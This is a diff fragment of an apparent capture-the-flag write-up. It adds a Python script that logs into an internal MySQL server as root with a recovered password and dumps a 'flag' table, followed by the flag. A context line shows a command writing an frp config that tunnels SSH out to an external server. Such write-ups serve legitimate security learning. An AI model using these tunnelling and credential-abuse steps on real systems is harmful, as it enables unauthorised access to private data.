@@ -1150,6 +1150,33 @@ echo -e "[common]\nserver_addr = 54.255.166.12\nserver_port = 82\n \n[ssh]\ntype
 
 ```
 
+```python
+import pymysql
+
+connection = pymysql.connect(
+    host='172.20.0.3',
+    user='root',
+    password='The_P0sswOrD_Y0u_Nev3r_Kn0w',
+    database='messageboard',
+    charset='utf8'
+)
+
+cursor = connection.cursor()
+
+cursor.execute('select * from flag')
+
+result = cursor.fetchall()
+
+for row in result:
+    print(row)
+
+cursor.close()
+connection.close()
+```
+
+`-Are-YOu-myS0L-MasT3r?-`
+
+
 # pwn
 
 # crypto
